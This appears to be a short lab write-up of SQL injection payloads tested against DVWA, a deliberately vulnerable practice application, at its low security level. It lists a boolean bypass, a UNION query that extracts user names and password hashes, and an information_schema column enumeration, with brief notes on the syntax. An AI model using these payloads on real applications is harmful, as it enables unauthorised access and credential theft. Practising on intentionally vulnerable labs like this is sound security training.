# SQL Injection — Payloads

Target: `http://192.168.187.4/dvwa/vulnerabilities/sqli/` (DVWA, security level: low)

## 1. Boolean-based / authentication bypass style
```
1' OR '1'='1
```
Returns every row in `users` instead of the single requested ID — confirms the input is concatenated directly into the SQL string.

## 2. UNION-based data extraction
```
1' UNION SELECT user, password FROM users-- -
```
Pulls `user` and `password` (MD5 hash) columns directly into the page output. Screenshot: `02_union_extract_creds.png`.

## 3. Schema enumeration via information_schema
```
1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users'-- -
```
Enumerates every column in the `users` table without needing prior knowledge of the schema. Screenshot: `03_information_schema_enum.png`.

## Notes
- `-- -` comments out the rest of the original query (trailing `LIMIT 1` etc).
- Column count/order was already known from the app (2 visible columns: First name, Surname) so the UNION SELECT uses exactly 2 columns.
